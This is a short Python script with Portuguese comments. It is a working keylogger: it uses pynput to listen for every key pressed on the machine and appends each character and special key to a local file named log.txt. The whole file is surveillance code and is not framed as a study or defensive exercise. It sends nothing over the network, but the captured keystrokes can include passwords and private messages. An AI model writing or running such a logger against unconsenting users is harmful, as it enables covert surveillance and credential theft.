from pynput import keyboard

# Teclas que devem ser ignoradas no log
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
}

def on_press(key):
    try:
        # Se a tecla possui um caractere legível (letras, números, símbolos comuns)
        if key.char is not None:
            with open("log.txt", "a", encoding="utf-8") as f:
                f.write(key.char)
    except AttributeError:
        # Teclas especiais (espaço, enter, backspace, etc.) caem aqui
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" [BACKSPACE] ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                # Para quaisquer outras teclas especiais não listadas
                f.write(f" [{key.name}] ")

# Inicializa o listener de forma correta
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
